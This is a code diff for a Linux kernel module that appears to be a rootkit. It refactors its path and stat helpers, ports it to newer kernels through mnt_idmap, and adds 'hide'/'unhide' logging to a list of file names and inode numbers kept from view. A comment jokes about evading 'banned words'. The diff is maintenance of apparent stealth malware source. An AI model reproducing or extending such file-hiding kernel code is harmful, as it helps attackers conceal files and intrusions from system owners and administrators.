@@ -16,34 +16,54 @@
 #include <linux/namei.h>
 #include "fs.h"
 #include "lkm.h"
+#include "log.h"
 
-int fs_file_stat(const char *name, struct kstat *stat) {
-    struct path path;
+bool fs_kern_path(const char *name, struct path *path) {
+    if (!name || !path)
+        goto error;
+
+#ifdef get_fs
+    mm_segment_t security_old_fs;
+    security_old_fs = get_fs();
+    set_fs(KERNEL_DS);
+#endif
+
+    if (kern_path(name, LOOKUP_FOLLOW, path))
+        goto error;
+
+#ifdef get_fs
+    set_fs(security_old_fs);
+#endif
+    return true;
+error:
+    return false;
+}
+
+/**
+ * callee must put the reference back
+ * with path_put after calling this function
+ */
+bool fs_file_stat(struct path *path, struct kstat *stat) {
 #ifdef get_fs
     mm_segment_t security_old_fs;
 #endif
-    int rc = -EINVAL;
-    if (!stat || !name)
-        return rc;
+    if (!path || !stat)
+        goto error;
 
 #ifdef get_fs
     security_old_fs = get_fs();
     set_fs(KERNEL_DS);
 #endif
 
-    rc = kern_path(name, LOOKUP_FOLLOW, &path);
-    if (rc)
-        goto out;
+    if (vfs_getattr(path, stat, STATX_BASIC_STATS, AT_STATX_SYNC_AS_STAT))
+        goto error;
 
-    rc = vfs_getattr(&path, stat, STATX_BASIC_STATS, AT_STATX_SYNC_AS_STAT);
-    path_put(&path);
-
-out:
 #ifdef get_fs
     set_fs(security_old_fs);
 #endif
-
-    return rc;
+    return true;
+error:
+    return false;
 }
 
 struct fs_file_node *fs_load_fnode(struct file *f) {
@@ -54,6 +74,9 @@ struct fs_file_node *fs_load_fnode(struct file *f) {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,11,0)
     u32 req_mask = STATX_INO;
     unsigned int query_mask = AT_STATX_SYNC_AS_STAT;
+#endif
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,8,0)
+    struct mnt_idmap *idmap;
 #endif
 
     if(!f) {
@@ -77,7 +100,10 @@ struct fs_file_node *fs_load_fnode(struct file *f) {
     if(!fnode)
         return NULL;
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,12,0)
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,3,0)
+    idmap = mnt_idmap(f->f_path.mnt);
+    op->getattr(idmap, &f->f_path, &stat, req_mask, query_mask);
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(5,12,0)
     op->getattr(task_active_pid_ns(current)->user_ns, &f->f_path, &stat, req_mask, query_mask);
 #elif LINUX_VERSION_CODE >= KERNEL_VERSION(4,11,0)
     op->getattr(&f->f_path, &stat, req_mask, query_mask);
@@ -177,6 +203,10 @@ static int _fs_add_name(const char *names[], bool ro, u64 ino) {
             strncpy(hn->name, (const char*)*s, len);
             hn->ro = ro;
             hn->ino = ino;
+            /** the gap caused by banned words
+             * is the most fun
+             */
+            prinfo("hide: '%s'\n", hn->name);
             list_add_tail(&hn->list, &names_node);
         }
     }
@@ -204,7 +234,7 @@ bool fs_del_name(const char *names[]) {
             list_for_each_entry_safe(node, node_safe, &names_node, list) {
                 if (node->ro) continue;
                 if (!strcmp(node->name, *s)) {
-                    prinfo("delname '%s'\n", *s);
+                    prinfo("unhide: '%s'\n", *s);
                     list_del(&node->list);
                     if (node->name)
                         kfree(node->name);
